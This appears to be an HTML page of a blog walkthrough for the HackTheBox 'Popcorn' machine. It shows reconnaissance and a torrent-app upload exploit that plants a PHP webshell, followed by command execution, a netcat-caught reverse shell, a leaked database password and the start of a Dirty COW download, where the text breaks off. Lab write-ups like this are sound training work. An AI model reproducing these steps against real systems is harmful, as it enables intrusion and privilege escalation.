@@ -1,0 +1,291 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Popcorn | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Popcorn from HackTheBox."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/10_popcorn/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Popcorn</h1> <p class="post-description">Popcorn from HackTheBox.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/popcorn/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Popcorn Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://app.hackthebox.com/Popcorn" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Working on another retired oldie. Let’s get to it.</p> <p>As per the usual, run nmap to get the open ports that we can investigate.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-A</span> <span class="nt">-oN</span> nmap 10.10.10.6
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-17 08:53 CST
+Nmap scan report <span class="k">for </span>10.10.10.6
+Host is up <span class="o">(</span>0.098s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 <span class="o">(</span>DSA<span class="o">)</span>
+|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d <span class="o">(</span>RSA<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.2.12
+|_http-title: Did not follow redirect to http://popcorn.htb/
+|_http-server-header: Apache/2.2.12 <span class="o">(</span>Ubuntu<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
+TCP/IP fingerprint:
+OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.94SVN%E<span class="o">=</span>4%D<span class="o">=</span>1/17%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>37373%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>678A
+OS:6F07%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>CD%GCD<span class="o">=</span>1%ISR<span class="o">=</span>CD%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>8<span class="o">)</span>OP
+OS:S<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M53CST11NW6%O2<span class="o">=</span>M53CST11NW6%O3<span class="o">=</span>M53CNNT11NW6%O4<span class="o">=</span>M53CST11NW6%O5<span class="o">=</span>M53CST
+OS:11NW6%O6<span class="o">=</span>M53CST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>16A0%W2<span class="o">=</span>16A0%W3<span class="o">=</span>16A0%W4<span class="o">=</span>16A0%W5<span class="o">=</span>16A0%W6<span class="o">=</span>16A0<span class="o">)</span>EC
+OS:N<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>16D0%O<span class="o">=</span>M53CNNSNW6%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>
+OS:AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>16A0%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%O<span class="o">=</span>M53CST11NW6%RD
+OS:<span class="o">=</span>0%Q<span class="o">=)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S
+OS:<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span>R
+OS:<span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%
+OS:RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
+
+Network Distance: 2 hops
+Service Info: Host: 127.0.0.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 8080/tcp<span class="o">)</span>
+HOP RTT      ADDRESS
+1   97.95 ms 10.10.14.1
+2   98.05 ms 10.10.10.6
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>28.89 seconds
+</code></pre></div></div> <p><br> Run nmap against all ports just to confirm that there are no weird ports running.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-A</span> <span class="nt">-oN</span> nmap 10.10.10.6
+└──╼ <span class="o">[</span>★]<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-oN</span> nmapfull 10.10.10.6
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-17 08:54 CST
+Nmap scan report <span class="k">for </span>10.10.10.6
+Host is up <span class="o">(</span>0.098s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.84 seconds
+</code></pre></div></div> <p><br> Noticing the redirect in the nmap output, add popcorn.htb to the /etc/hosts file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	debian12-parrot
+10.10.10.6 popcorn.htb
+</code></pre></div></div> <p><br> Check the landing page for the web server and view its source.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/popcorn/landing.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="View the landing page" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>view-source:http://popcorn.htb/
+
+<span class="nt">&lt;html&gt;&lt;body&gt;&lt;h1&gt;</span>It works!<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>This is the default web page for this server.<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;p&gt;</span>The web server software is running but no content has been added, yet.<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>
+</code></pre></div></div> <p><br> Use ffuf to fuzz and brute-force directories that are hopefully more interesting the It works! page.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://popcorn.htb/FUZZ <span class="nt">-fw</span> 22
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://popcorn.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 22
+________________________________________________
+
+test                    [Status: 200, Size: 47400, Words: 2478, Lines: 655, Duration: 110ms]
+torrent                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 97ms]
+rename                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 97ms]
+:: Progress: [220560/220560] :: Job [1/1] :: 408 req/sec :: Duration: [0:09:18] :: Errors: 1 ::
+</span></code></pre></div></div> <p><br> Investigate the /test folder and notice that it is the phpinfo() page.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PHP Version 5.2.10-2ubuntu6.10
+
+System 	Linux popcorn 2.6.31-14-generic-pae <span class="c">#48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686</span>
+
+&lt;snip&gt;
+</code></pre></div></div> <p><br> Check the /rename folder. It seem to describe how to use the Renamer API. Might be interesting if we can’t find something more useful. Or a rabbit hole. Anyway.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/popcorn/rename.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="View the rename page" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the /torrent directory. Looks like some sort of torrent repository program.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/popcorn/torrent.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Torrent Hoster" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the searchsploit for this torrent hoster program.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>searchsploit torrent hoster
+<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                                                                              |  Path
+<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Torrent Hoster - Remount Upload                                                                                                                             | php/webapps/11746.txt
+<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div> <p><br> Search online for an exploit that we can use. Come across this GitHub repository.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/popcorn/repo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Exploit Repository" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://github.com/Anon-Exploiter/exploits/blob/master/torrent_hoster_unauthenticated_rce.py" rel="external nofollow noopener" target="_blank">Repository</a></p> <p><br> Start a netcat listener.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div> <p><br> Download a copy to the local working folder. Update the script as there is a format function attached to print funtion instead of the string inside the function.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
+
+<span class="k">def</span> <span class="nf">parseTorrents</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[#] Browsing torrents on the website</span><span class="sh">"</span><span class="p">)</span>
+	<span class="n">request</span> 	<span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">index.php?mode=directory</span><span class="sh">"</span><span class="p">).</span><span class="n">text</span>
+	<span class="n">soup</span> 		<span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="sh">'</span><span class="s">html.parser</span><span class="sh">'</span><span class="p">).</span><span class="nf">find_all</span><span class="p">(</span><span class="sh">'</span><span class="s">td</span><span class="sh">'</span><span class="p">,</span> <span class="p">{</span><span class="sh">'</span><span class="s">align</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">left</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">width</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">300</span><span class="sh">'</span><span class="p">})</span>
+
+	<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">soup</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+		<span class="nf">exit</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Dang; Better luck next time!</span><span class="se">\n</span><span class="s">```</span><span class="se">\n</span><span class="s">No torrents found on the website!</span><span class="se">\n</span><span class="s">```</span><span class="sh">"</span><span class="p">)</span>
+
+	<span class="n">torrents</span> 	<span class="o">=</span> <span class="p">[]</span>
+
+	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[~] Found the following torrents with IDs:</span><span class="se">\n</span><span class="s">```</span><span class="sh">"</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">elements</span> <span class="ow">in</span> <span class="n">soup</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span> <span class="c1"># Reverse The List -- Select the last possible torrent to overwrite4
+</span>		<span class="c1"># print(elements)
+</span>		<span class="n">tId</span> 	<span class="o">=</span> <span class="n">elements</span><span class="p">.</span><span class="n">a</span><span class="p">[</span><span class="sh">'</span><span class="s">href</span><span class="sh">'</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+		<span class="n">path</span> 	<span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">upload_file.php?mode=upload&amp;id=</span><span class="sh">"</span> <span class="o">+</span> <span class="n">tId</span>
+		<span class="nf">print</span><span class="p">(</span><span class="n">tId</span><span class="p">)</span>
+		<span class="n">torrents</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+
+	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">```</span><span class="sh">"</span><span class="p">)</span>
+	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[$] Selecting the last possible torrent({}) to upload screenshot to!</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">torrents</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span>
+	<span class="nf">return</span><span class="p">(</span><span class="n">torrents</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+
+<span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
+</code></pre></div></div> <p><br> Run the exploit.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>python rce.py <span class="nt">--url</span><span class="o">=</span>http://popcorn.htb/torrent/
+
+&lt;snip&gt;
+
+<span class="o">[</span><span class="c">#] Browsing torrents on the website</span>
+<span class="o">[</span>~] Found the following torrents with IDs:
+
+&lt;snip&gt;
+
+<span class="o">[</span><span class="nv">$]</span> Selecting the last possible torrent<span class="o">(</span>d042db4335a8c8884da040e3ab4dc2df6c3efcea<span class="o">)</span> to upload screenshot to!
+<span class="o">[</span><span class="c">#] Uploading WebShell</span>
+
+<span class="o">[</span><span class="nv">$]</span> Whoa, we got a shell dude! Spawning Console!!!
+<span class="o">[</span>&amp;] Shell Uploaded: http://popcorn.htb/torrent//upload/d042db4335a8c8884da040e3ab4dc2df6c3efcea.php?c<span class="o">=</span>
+<span class="nb">.</span>
+<span class="nb">.</span>
+<span class="nb">.</span>
+<span class="nb">.</span>
+<span class="nb">.</span>
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+  File <span class="s2">"/home/biscottidiskette/my_data/machines/popcorn/rce.py"</span>, line 151, <span class="k">in</span> &lt;module&gt;
+    main<span class="o">()</span>
+  File <span class="s2">"/home/biscottidiskette/my_data/machines/popcorn/rce.py"</span>, line 137, <span class="k">in </span>main
+    accessShell<span class="o">(</span>args.url, path<span class="o">)</span>
+  File <span class="s2">"/home/biscottidiskette/my_data/machines/popcorn/rce.py"</span>, line 114, <span class="k">in </span>accessShell
+    <span class="nb">command</span> 	<span class="o">=</span> raw_input<span class="o">(</span><span class="s2">"</span><span class="nv">$ </span><span class="s2">"</span><span class="o">)</span>
+               ^^^^^^^^^
+NameError: name <span class="s1">'raw_input'</span> is not defined
+</code></pre></div></div> <p><br> Notice the error in the output. Navigate to the url indicated in the Shell Uploaded: line. For the c= parameter, use whoami to test remote code execution.</p> <p><a href="http://popcorn.htb/torrent//upload/d042db4335a8c8884da040e3ab4dc2df6c3efcea.php?c=whoami" rel="external nofollow noopener" target="_blank">http://popcorn.htb/torrent//upload/d042db4335a8c8884da040e3ab4dc2df6c3efcea.php?c=whoami</a></p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/popcorn/testrce.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Test the RCE" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use revshells to generate a reverse shell.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/popcorn/revshells.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Revshells" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://www.revshells.com/" rel="external nofollow noopener" target="_blank">Revshells</a></p> <p><br> Update the c parameter with the payload from revshells.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/popcorn/crevshell.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Attack!!!" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the listener and catch the shell. Use the python to upgrade the shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.29] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.6] 42132
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span>
+www-data@popcorn:/var/www/torrent/upload<span class="nv">$ </span>
+</code></pre></div></div> <p><br> Check the config.php file to get a potential password.</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
+
+  <span class="c1">//Edit This For TORRENT HOSTER Database</span>
+  <span class="c1">//database configuration</span>
+  <span class="nv">$CFG</span><span class="o">-&gt;</span><span class="n">host</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+  <span class="nv">$CFG</span><span class="o">-&gt;</span><span class="n">dbName</span> <span class="o">=</span> <span class="s2">"torrenthoster"</span><span class="p">;</span>	<span class="c1">//db name</span>
+  <span class="nv">$CFG</span><span class="o">-&gt;</span><span class="n">dbUserName</span> <span class="o">=</span> <span class="s2">"torrent"</span><span class="p">;</span>    <span class="c1">//db username</span>
+  <span class="nv">$CFG</span><span class="o">-&gt;</span><span class="n">dbPassword</span> <span class="o">=</span> <span class="s2">"SuperSecret!!"</span><span class="p">;</span>	<span class="c1">//db password</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/home/george<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat </span>user.txt
+&lt;redacted&gt;
+www-data@popcorn:/home/george<span class="nv">$ </span>/sbin/ifconfig
+/sbin/ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:46:bf  
+          inet addr:10.10.10.6  Bcast:10.10.11.255  Mask:255.255.254.0
+          inet6 addr: dead:beef::250:56ff:feb9:46bf/64 Scope:Global
+          inet6 addr: fe80::250:56ff:feb9:46bf/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2570 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:548 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:295981 <span class="o">(</span>295.9 KB<span class="o">)</span>  TX bytes:430602 <span class="o">(</span>430.6 KB<span class="o">)</span>
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:96 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:96 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:14520 <span class="o">(</span>14.5 KB<span class="o">)</span>  TX bytes:14520 <span class="o">(</span>14.5 KB<span class="o">)</span>
+</code></pre></div></div> <p><br> Run uname -a to get the version of Linux.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/dev/shm<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+<span class="nb">uname</span> <span class="nt">-a</span>
+Linux popcorn 2.6.31-14-generic-pae <span class="c">#48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux</span>
+</code></pre></div></div> <p><br> This version of Linux is vulnerable to Dirty Cow privilege escalation exploit.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/popcorn/dirtycow.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Dirty Cow" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://www.exploit-db.com/exploits/40839" rel="external nofollow noopener" target="_blank">Exploit-DB</a></p> <p><br> Download the dirty payload.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>wget https://www.exploit-db.com/raw/40839 <span class="nt">-O</span> dirty.c
+<span class="nt">--2025-01-17</span> 18:07:07--  https://www.exploit-db.com/raw/40839
+Resolving www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>... 192.124.249.13
+Connecting to www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5006 <span class="o">(</span>4.9K<span class="o">)</span> <span class="o">[</span>text/plain]
+Saving to: ‘dirty.c’
+
+dirty.c                                         100%[<span class="o">=====================================================================================================&gt;]</span>   4.89K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      
+
